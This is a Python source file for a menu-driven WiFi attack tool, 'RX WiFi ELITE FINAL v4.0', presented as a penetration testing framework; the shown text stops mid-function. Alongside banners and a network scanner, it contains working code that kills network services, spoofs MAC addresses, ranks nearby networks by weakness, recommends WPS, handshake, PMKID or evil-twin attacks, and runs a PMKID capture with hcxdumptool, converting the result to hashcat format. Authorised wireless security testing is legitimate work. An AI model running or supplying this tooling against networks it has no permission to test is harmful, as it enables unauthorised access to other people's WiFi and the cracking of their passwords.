#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
██████╗ ██╗  ██╗    ██╗    ██╗██╗███████╗██╗███████╗    ███████╗██╗     ██╗████████╗███████╗
██╔══██╗╚██╗██╔╝    ██╗    ██║██║██╔════╝██║██╔════╝    ██╔════╝██║     ██║╚══██╔══╝██╔════╝
██████╔╝ ╚███╔╝     ██║ █╗ ██║██║█████╗  ██║███████╗    █████╗  ██║     ██║   ██║   █████╗  
██╔══██╗ ██╔██╗     ██║███╗██║██║██╔══╝  ██║╚════██║    ██╔══╝  ██║     ██║   ██║   ██╔══╝  
██║  ██║██╔╝ ██╗    ╚███╔███╔╝██║██║     ██║███████║    ███████╗███████╗██║   ██║   ███████╗
╚═╝  ╚═╝╚═╝  ╚═╝     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝╚══════╝    ╚══════╝╚══════╝╚═╝   ╚═╝   ╚══════╝
                                  ELITE FINAL v4.0
                  ULTIMATE WIRELESS PENETRATION TESTING FRAMEWORK
================================================================================
"""

import os
import sys
import time
import json
import signal
import tempfile
import subprocess
import threading
import re
from datetime import datetime
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple, Any
from pathlib import Path
import logging
import argparse
import csv
import hashlib
import random
import string

# ============================================================================
# ADVANCED GRAPHICS SYSTEM
# ============================================================================

class EliteGraphics:
    """Professional graphics system with advanced animations"""
    
    COLORS = {
        'header': 45,      # Light blue
        'success': 46,     # Green
        'warning': 214,    # Orange
        'error': 196,      # Red
        'info': 51,        # Cyan
        'menu': 39,        # Blue
        'highlight': 226,  # Yellow
        'dim': 240,        # Gray
        'purple': 129,     # Purple
        'pink': 201,       # Pink
        'neon': 82,        # Neon green
    }
    
    @staticmethod
    def color(text: str, color_code: int) -> str:
        """Apply color to text"""
        return f"\033[38;5;{color_code}m{text}\033[0m"
    
    @staticmethod
    def clear():
        """Clear terminal screen"""
        os.system('clear' if os.name == 'posix' else 'cls')
    
    @staticmethod
    def show_banner():
        """Display elite banner"""
        EliteGraphics.clear()
        
        banner = f"""
{EliteGraphics.color('╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗', 45)}
{EliteGraphics.color('║                                                                                                                    ║', 45)}
{EliteGraphics.color('║  ██████╗ ██╗  ██╗    ██╗    ██╗██╗███████╗██╗███████╗    ███████╗██╗     ██╗████████╗███████╗                     ║', 45)}
{EliteGraphics.color('║  ██╔══██╗╚██╗██╔╝    ██╗    ██║██║██╔════╝██║██╔════╝    ██╔════╝██║     ██║╚══██╔══╝██╔════╝                     ║', 45)}
{EliteGraphics.color('║  ██████╔╝ ╚███╔╝     ██║ █╗ ██║██║█████╗  ██║███████╗    █████╗  ██║     ██║   ██║   █████╗                       ║', 45)}
{EliteGraphics.color('║  ██╔══██╗ ██╔██╗     ██║███╗██║██║██╔══╝  ██║╚════██║    ██╔══╝  ██║     ██║   ██║   ██╔══╝                       ║', 45)}
{EliteGraphics.color('║  ██║  ██║██╔╝ ██╗    ╚███╔███╔╝██║██║     ██║███████║    ███████╗███████╗██║   ██║   ███████╗                     ║', 45)}
{EliteGraphics.color('║  ╚═╝  ╚═╝╚═╝  ╚═╝     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝╚══════╝    ╚══════╝╚══════╝╚═╝   ╚═╝   ╚══════╝                     ║', 45)}
{EliteGraphics.color('║                                                                                                                    ║', 45)}
{EliteGraphics.color('║                                E L I T E   F I N A L   v 4 . 0                                                    ║', 129)}
{EliteGraphics.color('║                         U L T I M A T E   P E N E T R A T I O N   F R A M E W O R K                              ║', 51)}
{EliteGraphics.color('║                                                                                                                    ║', 45)}
{EliteGraphics.color('╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝', 45)}
        """
        
        print(banner)
        time.sleep(0.3)
    
    @staticmethod
    def show_rx_team():
        """Display RX-TEAM logo"""
        rx_logo = f"""
{EliteGraphics.color('██████╗ ██╗  ██╗    ████████╗███████╗ █████╗ ███╗   ███╗', 51)}
{EliteGraphics.color('██╔══██╗╚██╗██╔╝    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║', 51)}
{EliteGraphics.color('██████╔╝ ╚███╔╝        ██║   █████╗  ███████║██╔████╔██║', 51)}
{EliteGraphics.color('██╔══██╗ ██╔██╗        ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║', 51)}
{EliteGraphics.color('██║  ██║██╔╝ ██╗       ██║   ███████╗██║  ██║██║ ╚═╝ ██║', 51)}
{EliteGraphics.color('╚═╝  ╚═╝╚═╝  ╚═╝       ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝', 51)}
        """
        
        print(rx_logo)
        time.sleep(0.2)
    
    @staticmethod
    def show_matrix_effect(duration=2):
        """Display matrix effect"""
        matrix_chars = "01"
        width = 80
        height = 10
        
        for frame in range(int(duration * 10)):
            EliteGraphics.clear()
            print(EliteGraphics.color("=" * width, 82))
            for h in range(height):
                line = ''.join(random.choice(matrix_chars) for _ in range(width))
                print(EliteGraphics.color(line, 82))
            print(EliteGraphics.color("=" * width, 82))
            time.sleep(0.1)
    
    @staticmethod
    def show_loading(text="LOADING", duration=2):
        """Display loading animation"""
        frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        
        start_time = time.time()
        frame_idx = 0
        
        while time.time() - start_time < duration:
            frame = frames[frame_idx % len(frames)]
            print(f"\r{EliteGraphics.color(frame, 51)} {text}", end="")
            frame_idx += 1
            time.sleep(0.1)
        
        print(f"\r{EliteGraphics.color('✓', 46)} {text} COMPLETE")
    
    @staticmethod
    def show_progress(iteration, total, prefix='', suffix='', length=50):
        """Display progress bar"""
        percent = ("{0:.1f}").format(100 * (iteration / float(total)))
        filled_length = int(length * iteration // total)
        bar = '█' * filled_length + '░' * (length - filled_length)
        
        if float(percent) < 33:
            color = 196
        elif float(percent) < 66:
            color = 214
        else:
            color = 46
        
        bar_colored = EliteGraphics.color(bar[:filled_length], color) + bar[filled_length:]
        
        print(f'\r{prefix} |{bar_colored}| {percent}% {suffix}', end='\r')
        if iteration == total:
            print()
    
    @staticmethod
    def show_menu_title(title):
        """Display menu title"""
        width = 70
        padding = (width - len(title) - 4) // 2
        print(f"\n{EliteGraphics.color('═' * width, 45)}")
        print(f"{EliteGraphics.color(' ' * padding + '[ ' + title + ' ]' + ' ' * padding, 45)}")
        print(f"{EliteGraphics.color('═' * width, 45)}")
    
    @staticmethod
    def show_networks(networks, max_display=20):
        """Display networks in table"""
        if not networks:
            print(EliteGraphics.color("NO NETWORKS FOUND", 196))
            return
        
        print(f"\n{EliteGraphics.color('═' * 130, 45)}")
        header = f"{EliteGraphics.color('#', 226):<2} " \
                f"{EliteGraphics.color('BSSID', 226):<18} " \
                f"{EliteGraphics.color('ESSID', 226):<25} " \
                f"{EliteGraphics.color('CH', 226):<3} " \
                f"{EliteGraphics.color('PWR', 226):<4} " \
                f"{EliteGraphics.color('ENC', 226):<12} " \
                f"{EliteGraphics.color('CLI', 226):<3} " \
                f"{EliteGraphics.color('SECURITY', 226):<10} " \
                f"{EliteGraphics.color('VULN', 226):<8}"
        print(header)
        print(f"{EliteGraphics.color('═' * 130, 45)}")
        
        sorted_nets = sorted(networks.values(), key=lambda x: x.signal, reverse=True)[:max_display]
        
        for i, net in enumerate(sorted_nets, 1):
            essid = net.essid[:22] + '...' if len(net.essid) > 25 else net.essid.ljust(25)
            
            # Security color
            if net.security_score >= 80:
                sec_color = 46
                sec_text = "STRONG"
            elif net.security_score >= 50:
                sec_color = 214
                sec_text = "MEDIUM"
            else:
                sec_color = 196
                sec_text = "WEAK"
            
            # Vulnerability
            vuln = EliteGraphics.color("YES", 196) if net.is_vulnerable else EliteGraphics.color("NO", 46)
            
            print(f"{i:<2} {net.bssid:<18} {essid:<25} "
                  f"{net.channel:<3} {net.signal:<4} {net.encryption[:10]:<12} "
                  f"{len(net.clients):<3} {EliteGraphics.color(sec_text, sec_color):<10} {vuln:<8}")
        
        print(f"{EliteGraphics.color('═' * 130, 45)}")
        print(f"{EliteGraphics.color(f'TOTAL: {len(networks)} NETWORKS | {sum(len(n.clients) for n in networks.values())} CLIENTS', 51)}")

# ============================================================================
# DATA STRUCTURES
# ============================================================================

@dataclass
class WiFiNetwork:
    """WiFi network data structure"""
    bssid: str
    essid: str
    channel: int
    signal: int  # dBm
    encryption: str
    cipher: str
    auth: str
    wps: bool = False
    wps_locked: bool = False
    clients: List[str] = field(default_factory=list)
    first_seen: str = ""
    last_seen: str = ""
    ivs: int = 0
    beacon: int = 0
    
    @property
    def security_score(self) -> int:
        """Calculate security score"""
        scores = {
            'WPA3': 95,
            'WPA2-802.1X': 85,
            'WPA2': 65,
            'WPA': 40,
            'WEP': 10,
            'OPEN': 0
        }
        
        enc_upper = self.encryption.upper()
        for key, score in scores.items():
            if key in enc_upper:
                return score
        return 50
    
    @property
    def is_vulnerable(self) -> bool:
        """Check if network has known vulnerabilities"""
        vuln_indicators = ['WEP', 'WPA', 'TKIP', 'WPS']
        enc_upper = self.encryption.upper()
        
        if 'WEP' in enc_upper:
            return True
        if 'WPA' in enc_upper and not 'WPA3' in enc_upper:
            return True
        return self.wps and not self.wps_locked
    
    @property
    def recommended_attack(self) -> str:
        """Get recommended attack method"""
        enc_upper = self.encryption.upper()
        
        if 'WEP' in enc_upper:
            return "WEP_ATTACK"
        elif 'WPA' in enc_upper:
            if self.wps and not self.wps_locked:
                return "WPS_ATTACK"
            elif self.clients:
                return "HANDSHAKE_ATTACK"
            else:
                return "PMKID_ATTACK"
        elif 'OPEN' in enc_upper:
            return "EVIL_TWIN"
        else:
            return "UNKNOWN"

@dataclass
class WiFiClient:
    """WiFi client data structure"""
    mac: str
    bssid: str
    signal: int
    packets: int
    probed_essids: List[str] = field(default_factory=list)
    vendor: str = ""
    is_associated: bool = True
    
    @property
    def vendor_from_mac(self) -> str:
        """Get vendor from MAC OUI"""
        # Common vendor OUIs
        ouis = {
            '00:0C:29': 'VMware',
            '00:50:56': 'VMware',
            '00:1A:11': 'Google',
            '00:1B:63': 'Apple',
            '00:1C:B3': 'Dell',
            '00:1D:72': 'ASUS',
            '00:1E:68': 'Intel',
            '00:21:6A': 'Cisco',
            '00:24:D6': 'Samsung',
            '00:26:BB': 'Apple',
            '28:E3:47': 'TP-Link',
            'C8:3A:35': 'Tenda',
            'B8:27:EB': 'Raspberry Pi',
            'DC:A6:32': 'Raspberry Pi'
        }
        
        mac_prefix = self.mac.upper()[:8]
        return ouis.get(mac_prefix, "Unknown")

class AttackType:
    """Attack type constants"""
    PMKID = "PMKID"
    HANDSHAKE = "HANDSHAKE"
    WPS_PIXIE = "WPS_PIXIE"
    WPS_PIN = "WPS_PIN"
    DEAUTH = "DEAUTH"
    BEACON_FLOOD = "BEACON_FLOOD"
    EVIL_TWIN = "EVIL_TWIN"
    KRACK = "KRACK"
    WEP_ATTACK = "WEP_ATTACK"
    ROGUE_AP = "ROGUE_AP"
    CAFFE_LATTE = "CAFFE_LATTE"
    HIRTE = "HIRTE"
    FRAGMENTATION = "FRAGMENTATION"

# ============================================================================
# SYSTEM VALIDATOR
# ============================================================================

class SystemValidator:
    """Validate system requirements"""
    
    REQUIRED_TOOLS = {
        'aircrack-ng': ['airodump-ng', 'aireplay-ng', 'aircrack-ng', 'airmon-ng'],
        'iw': ['iw'],
        'ip': ['ip'],
        'hcxtools': ['hcxdumptool', 'hcxpcaptool'],
        'reaver': ['reaver'],
        'bully': ['bully'],
        'wash': ['wash'],
        'hostapd': ['hostapd'],
        'dnsmasq': ['dnsmasq'],
        'mdk4': ['mdk4'],
        'mdk3': ['mdk3'],
    }
    
    @staticmethod
    def check_root() -> bool:
        """Check root privileges"""
        return os.geteuid() == 0
    
    @staticmethod
    def check_dependencies() -> Dict[str, bool]:
        """Check required tools"""
        results = {}
        for tool, commands in SystemValidator.REQUIRED_TOOLS.items():
            available = all(SystemValidator._check_command(cmd) for cmd in commands)
            results[tool] = available
        return results
    
    @staticmethod
    def _check_command(cmd: str) -> bool:
        """Check if command exists"""
        try:
            result = subprocess.run(['which', cmd], 
                                  capture_output=True, text=True, timeout=5)
            return result.returncode == 0
        except:
            return False
    
    @staticmethod
    def check_wifi_card() -> bool:
        """Check for wireless card"""
        try:
            result = subprocess.run(['iw', 'dev'], 
                                  capture_output=True, text=True)
            return 'phy' in result.stdout
        except:
            return False

# ============================================================================
# ELITE INTERFACE MANAGER
# ============================================================================

class EliteInterfaceManager:
    """Advanced interface management"""
    
    def __init__(self):
        self.interfaces = []
        self.monitor_interface = None
        self.original_state = {}
        self.capabilities = {}
    
    def discover_all(self) -> List[str]:
        """Discover all wireless interfaces"""
        self.interfaces = []
        
        # Method 1: iw dev
        try:
            result = subprocess.run(['iw', 'dev'], 
                                  capture_output=True, text=True, timeout=10)
            for line in result.stdout.split('\n'):
                if 'Interface' in line:
                    iface = line.split()[1]
                    self.interfaces.append(iface)
        except:
            pass
        
        # Method 2: ip link
        try:
            result = subprocess.run(['ip', 'link', 'show'], 
                                  capture_output=True, text=True, timeout=5)
            for line in result.stdout.split('\n'):
                if any(x in line.lower() for x in ['wl', 'wlan', 'wlp', 'ath', 'ra']):
                    parts = line.split(':')
                    if len(parts) >= 2:
                        iface = parts[1].strip()
                        if iface not in self.interfaces:
                            self.interfaces.append(iface)
        except:
            pass
        
        # Analyze capabilities
        for iface in self.interfaces:
            self.capabilities[iface] = self._analyze_capabilities(iface)
        
        return self.interfaces
    
    def _analyze_capabilities(self, interface: str) -> Dict:
        """Analyze interface capabilities"""
        caps = {
            'monitor': False,
            'injection': False,
            'bands': [],
            'channels': [],
            'driver': 'unknown',
            'chipset': 'unknown',
            'tx_power': 0
        }
        
        try:
            # Check monitor mode
            result = subprocess.run(['iw', 'phy', 'info'], 
                                  capture_output=True, text=True, timeout=5)
            if 'monitor' in result.stdout.lower():
                caps['monitor'] = True
            
            # Check injection
            if 'injection' in result.stdout.lower():
                caps['injection'] = True
            
            # Check bands
            if '5GHz' in result.stdout:
                caps['bands'].append('5GHz')
            if '2.4GHz' in result.stdout:
                caps['bands'].append('2.4GHz')
            
            # Get driver info
            sysfs_path = f'/sys/class/net/{interface}/device/driver'
            if os.path.exists(sysfs_path):
                caps['driver'] = os.path.basename(os.readlink(sysfs_path))
            
        except:
            pass
        
        return caps
    
    def enable_monitor_mode(self, interface: str) -> Optional[str]:
        """Enable monitor mode with advanced techniques"""
        EliteGraphics.show_loading(f"ENABLING MONITOR MODE ON {interface}")
        
        # Save original state
        self._save_state(interface)
        
        # Kill interfering processes
        self._kill_interfering()
        
        # Try multiple methods
        methods = [
            self._enable_airmon_ng,
            self._enable_iw,
            self._enable_ip,
            self._enable_wlanconfig
        ]
        
        for method in methods:
            try:
                monitor_iface = method(interface)
                if monitor_iface:
                    self.monitor_interface = monitor_iface
                    self._optimize_monitor(monitor_iface)
                    print(f"{EliteGraphics.color('✓', 46)} MONITOR MODE ENABLED: {monitor_iface}")
                    return monitor_iface
            except:
                continue
        
        print(f"{EliteGraphics.color('✗', 196)} FAILED TO ENABLE MONITOR MODE")
        return None
    
    def _enable_airmon_ng(self, interface: str) -> Optional[str]:
        """Enable via airmon-ng"""
        try:
            subprocess.run(['airmon-ng', 'check', 'kill'], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)
            
            result = subprocess.run(['airmon-ng', 'start', interface], 
                                  capture_output=True, text=True, timeout=15)
            
            # Parse output
            for line in result.stdout.split('\n'):
                if 'monitor mode' in line.lower() and 'enabled' in line.lower():
                    for word in line.split():
                        if interface in word or word.endswith('mon'):
                            return word
            
            return None
        except:
            return None
    
    def _enable_iw(self, interface: str) -> Optional[str]:
        """Enable via iw"""
        try:
            subprocess.run(['ip', 'link', 'set', interface, 'down'],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(['iw', interface, 'set', 'type', 'monitor'],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(['ip', 'link', 'set', interface, 'up'],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Verify
            result = subprocess.run(['iw', interface, 'info'],
                                  capture_output=True, text=True)
            if 'type monitor' in result.stdout:
                return interface
            
            return None
        except:
            return None
    
    def _enable_ip(self, interface: str) -> Optional[str]:
        """Enable via ip/iw combination"""
        try:
            subprocess.run(['ip', 'link', 'set', interface, 'down'],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(['iw', 'dev', interface, 'set', 'type', 'monitor'],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(['iw', 'dev', interface, 'set', 'monitor', 'control'],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(['ip', 'link', 'set', interface, 'up'],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            return interface
        except:
            return None
    
    def _enable_wlanconfig(self, interface: str) -> Optional[str]:
        """Enable via wlanconfig (Atheros)"""
        try:
            result = subprocess.run(['which', 'wlanconfig'],
                                  capture_output=True, text=True)
            if result.returncode == 0:
                subprocess.run(['wlanconfig', interface, 'destroy'],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['wlanconfig', interface, 'create', 'wlandev', interface, 'wlanmode', 'monitor'],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return interface
        except:
            pass
        
        return None
    
    def _save_state(self, interface: str):
        """Save original interface state"""
        try:
            # Get MAC
            mac_path = f'/sys/class/net/{interface}/address'
            if os.path.exists(mac_path):
                with open(mac_path, 'r') as f:
                    mac = f.read().strip()
            else:
                mac = ""
            
            # Get mode
            mode = "unknown"
            try:
                result = subprocess.run(['iw', interface, 'info'],
                                      capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'type' in line:
                        mode = line.split()[1]
                        break
            except:
                pass
            
            self.original_state[interface] = {
                'mac': mac,
                'mode': mode,
                'timestamp': time.time()
            }
            
        except:
            pass
    
    def _kill_interfering(self):
        """Kill interfering processes"""
        processes = [
            'NetworkManager',
            'wpa_supplicant',
            'dhclient',
            'avahi-daemon',
            'dnsmasq',
            'systemd-resolved'
        ]
        
        for proc in processes:
            subprocess.run(['pkill', '-9', proc],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        time.sleep(2)
    
    def _optimize_monitor(self, interface: str):
        """Optimize monitor interface"""
        try:
            # Set MTU
            subprocess.run(['ip', 'link', 'set', interface, 'mtu', '2304'],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Enable promiscuous
            subprocess.run(['ip', 'link', 'set', interface, 'promisc', 'on'],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Disable power saving
            subprocess.run(['iw', interface, 'set', 'power_save', 'off'],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Set TX power
            subprocess.run(['iw', interface, 'set', 'txpower', 'fixed', '3000'],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
        except:
            pass
    
    def set_channel(self, interface: str, channel: int) -> bool:
        """Set interface channel"""
        try:
            result = subprocess.run(['iw', interface, 'set', 'channel', str(channel)],
                                  capture_output=True, text=True, timeout=5)
            return result.returncode == 0
        except:
            return False
    
    def set_channel_hop(self, interface: str, channels: List[int], delay: float = 0.1):
        """Channel hopping thread"""
        def hop():
            while getattr(self, '_hopping', False):
                for channel in channels:
                    if not self._hopping:
                        break
                    self.set_channel(interface, channel)
                    time.sleep(delay)
        
        self._hopping = True
        thread = threading.Thread(target=hop, daemon=True)
        thread.start()
        return thread
    
    def stop_channel_hop(self):
        """Stop channel hopping"""
        self._hopping = False
    
    def change_mac(self, interface: str, mac: str = None) -> bool:
        """Change MAC address"""
        if not mac:
            # Generate random MAC
            first_byte = random.randint(0x02, 0xFE) & 0xFE
            mac_parts = [f"{first_byte:02x}"]
            mac_parts.extend(f"{random.randint(0x00, 0xFF):02x}" for _ in range(5))
            mac = ':'.join(mac_parts)
        
        try:
            subprocess.run(['ip', 'link', 'set', interface, 'down'],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            subprocess.run(['ip', 'link', 'set', 'dev', interface, 'address', mac],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            subprocess.run(['ip', 'link', 'set', interface, 'up'],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Verify
            time.sleep(1)
            with open(f'/sys/class/net/{interface}/address', 'r') as f:
                current_mac = f.read().strip()
            
            return current_mac.lower() == mac.lower()
            
        except:
            return False
    
    def restore_all(self):
        """Restore all interfaces to original state"""
        EliteGraphics.show_loading("RESTORING NETWORK STATE")
        
        # Stop monitor interface
        if self.monitor_interface:
            try:
                subprocess.run(['ip', 'link', 'set', self.monitor_interface, 'down'],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                if self.monitor_interface.endswith('mon'):
                    subprocess.run(['airmon-ng', 'stop', self.monitor_interface],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                else:
                    subprocess.run(['iw', self.monitor_interface, 'set', 'type', 'managed'],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass
        
        # Restore original interfaces
        for interface, state in self.original_state.items():
            try:
                # Restore mode
                subprocess.run(['iw', interface, 'set', 'type', 'managed'],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                # Restore MAC
                if state.get('mac'):
                    subprocess.run(['ip', 'link', 'set', interface, 'down'],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(['ip', 'link', 'set', 'dev', interface, 'address', state['mac']],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(['ip', 'link', 'set', interface, 'up'],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                continue
        
        # Restart network services
        try:
            subprocess.run(['systemctl', 'restart', 'NetworkManager'],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(['systemctl', 'restart', 'wpa_supplicant'],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
        
        print(f"{EliteGraphics.color('✓', 46)} NETWORK RESTORED")

# ============================================================================
# ELITE NETWORK SCANNER
# ============================================================================

class EliteNetworkScanner:
    """Advanced network scanner"""
    
    def __init__(self, interface: str):
        self.interface = interface
        self.networks: Dict[str, WiFiNetwork] = {}
        self.clients: Dict[str, WiFiClient] = {}
        self.scanning = False
        self.scan_thread = None
        self.last_scan = 0
        
    def scan(self, duration: int = 30, channels: List[int] = None) -> Dict[str, WiFiNetwork]:
        """Perform network scan"""
        EliteGraphics.show_loading(f"SCANNING FOR {duration} SECONDS")
        
        temp_dir = tempfile.mkdtemp(prefix='rx_scan_')
        output_file = Path(temp_dir) / 'scan'
        
        # Build command
        cmd = [
            'airodump-ng',
            self.interface,
            '-w', str(output_file),
            '--output-format', 'csv',
            '--write-interval', '5',
            '--berlin', '10'
        ]
        
        if channels:
            channel_str = ','.join(map(str, channels))
            cmd.extend(['-c', channel_str])
        
        try:
            # Start scan
            process = subprocess.Popen(cmd,
                                     stdout=subprocess.DEVNULL,
                                     stderr=subprocess.DEVNULL,
                                     text=True)
            
            # Monitor progress
            start_time = time.time()
            while time.time() - start_time < duration:
                if process.poll() is not None:
                    break
                
                elapsed = time.time() - start_time
                EliteGraphics.show_progress(int(elapsed), duration,
                                          prefix='SCANNING',
                                          suffix=f'Time: {int(duration - elapsed)}s')
                time.sleep(0.5)
            
            # Stop scan
            process.terminate()
            process.wait(timeout=5)
            
            # Parse results
            csv_file = Path(f"{output_file}-01.csv")
            if csv_file.exists():
                self._parse_results(csv_file)
                csv_file.unlink()
            
            self.last_scan = time.time()
            EliteGraphics.show_networks(self.networks)
            
            return self.networks
            
        except Exception as e:
            print(f"{EliteGraphics.color('✗', 196)} SCAN FAILED: {e}")
            return {}
    
    def _parse_results(self, csv_file: Path):
        """Parse airodump-ng CSV results"""
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            lines = content.split('\n')
            section = 0  # 0=before networks, 1=networks, 2=clients
            
            for line in lines:
                line = line.strip()
                
                # Section boundaries
                if 'BSSID' in line and 'ESSID' in line:
                    section = 1
                    continue
                elif 'Station MAC' in line:
                    section = 2
                    continue
                elif not line:
                    continue
                
                if section == 1:
                    self._parse_network_line(line)
                elif section == 2:
                    self._parse_client_line(line)
                    
        except Exception as e:
            print(f"{EliteGraphics.color('✗', 196)} PARSE ERROR: {e}")
    
    def _parse_network_line(self, line: str):
        """Parse network line"""
        try:
            # Handle quoted ESSIDs
            parts = []
            in_quotes = False
            current = ""
            
            for char in line:
                if char == '"':
                    in_quotes = not in_quotes
                elif char == ',' and not in_quotes:
                    parts.append(current.strip())
                    current = ""
                else:
                    current += char
            
            if current:
                parts.append(current.strip())
            
            if len(parts) < 14:
                return
            
            bssid = parts[0].strip()
            if len(bssid) != 17:
                return
            
            # Extract ESSID
            essid = parts[13] if len(parts) > 13 else ''
            if essid.startswith('"') and essid.endswith('"'):
                essid = essid[1:-1]
            
            # Check WPS
            wps = False
            wps_locked = False
            if len(parts) > 14 and 'WPS' in parts[14]:
                wps = True
                wps_locked = 'LOCKED' in parts[14]
            
            # Create network object
            network = WiFiNetwork(
                bssid=bssid,
                essid=essid if essid else 'Hidden',
                channel=int(parts[3]) if parts[3].isdigit() else 0,
                signal=int(parts[8]) if parts[8].lstrip('-').isdigit() else -100,
                encryption=parts[5] if len(parts) > 5 else 'UNKNOWN',
                cipher=parts[6] if len(parts) > 6 else '',
                auth=parts[7] if len(parts) > 7 else '',
                wps=wps,
                wps_locked=wps_locked,
                first_seen=parts[1] if len(parts) > 1 else '',
                last_seen=parts[2] if len(parts) > 2 else '',
                ivs=int(parts[10]) if len(parts) > 10 and parts[10].isdigit() else 0,
                beacon=int(parts[9]) if len(parts) > 9 and parts[9].isdigit() else 0
            )
            
            self.networks[bssid] = network
            
        except Exception as e:
            print(f"{EliteGraphics.color('✗', 196)} NETWORK PARSE ERROR: {e}")
    
    def _parse_client_line(self, line: str):
        """Parse client line"""
        try:
            parts = [p.strip() for p in line.split(',')]
            
            if len(parts) < 6:
                return
            
            mac = parts[0]
            if len(mac) != 17:
                return
            
            client = WiFiClient(
                mac=mac,
                bssid=parts[5] if len(parts) > 5 else '',
                signal=int(parts[3]) if parts[3].lstrip('-').isdigit() else -100,
                packets=int(parts[2]) if parts[2].isdigit() else 0,
                is_associated=bool(parts[5].strip())
            )
            
            if len(parts) > 4 and parts[4]:
                client.probed_essids = [parts[4]]
            
            self.clients[mac] = client
            
            # Associate with network
            if client.bssid in self.networks:
                self.networks[client.bssid].clients.append(mac)
                
        except Exception as e:
            print(f"{EliteGraphics.color('✗', 196)} CLIENT PARSE ERROR: {e}")
    
    def get_network(self, bssid: str) -> Optional[WiFiNetwork]:
        """Get network by BSSID"""
        return self.networks.get(bssid)
    
    def get_networks_by_vulnerability(self) -> List[WiFiNetwork]:
        """Get vulnerable networks"""
        return [n for n in self.networks.values() if n.is_vulnerable]
    
    def get_clients_for_network(self, bssid: str) -> List[WiFiClient]:
        """Get clients for specific network"""
        return [self.clients[c] for c in self.networks[bssid].clients if c in self.clients]

# ============================================================================
# ELITE ATTACK ENGINE
# ============================================================================

class EliteAttackEngine:
    """Advanced attack engine with multiple attack vectors"""
    
    def __init__(self, interface: str):
        self.interface = interface
        self.active_attacks = {}
        self.results_dir = Path("attack_results")
        self.results_dir.mkdir(exist_ok=True)
        
    def execute_pmkid_attack(self, target_bssid: str, duration: int = 180) -> Optional[Path]:
        """Execute PMKID attack"""
        EliteGraphics.show_loading("EXECUTING PMKID ATTACK")
        
        output_base = self.results_dir / f"pmkid_{target_bssid.replace(':', '')}_{int(time.time())}"
        
        try:
            # Start hcxdumptool
            cmd = [
                'hcxdumptool',
                '-i', self.interface,
                '-o', f"{output_base}.pcapng",
                '--enable_status=1',
                f'--filterlist_ap={target_bssid}',
                '--filtermode=2',
                '--stop_ap_attacks=1'
            ]
            
            process = subprocess.Popen(cmd,
                                     stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT,
                                     text=True,
                                     bufsize=1)
            
            self.active_attacks['pmkid'] = process
            
            # Monitor
            start_time = time.time()
            hash_file = None
            
            while time.time() - start_time < duration:
                if process.poll() is not None:
                    break
                
                # Check for output
                pcap_file = Path(f"{output_base}.pcapng")
                if pcap_file.exists() and pcap_file.stat().st_size > 0:
                    hash_file = self._convert_pmkid(pcap_file, output_base)
                    if hash_file:
                        break
                
                time.sleep(2)
            
            # Cleanup
            process.terminate()
            process.wait(timeout=5)
            
            if hash_file and hash_file.exists():
                print(f"{EliteGraphics.color('✓', 46)} PMKID CAPTURED: {hash_file}")
                return hash_file
            else:
                print(f"{EliteGraphics.color('✗', 196)} PMKID ATTACK FAILED")
                return None
                
        except Exception as e:
            print(f"{EliteGraphics.color('✗', 196)} PMKID ERROR: {e}")
            return None
    
    def _convert_pmkid(self, pcap_file: Path, output_base: Path) -> Optional[Path]:
        """Convert PMKID to hashcat format"""
        hash_file = Path(f"{output_base}.hash")
        
        try:
            result = subprocess.run(['hcxpcaptool', '-z', str(hash_file), str(pcap_file)],
                                  capture_output=True, text=True, timeout=30)
            
            if hash_file.exists() and hash_file.stat().st_size > 0:
                return hash_file
                
        except:
            pass
        
        return None
    
    def execute_handshake_attack(self, target_bssid: str, channel: int,
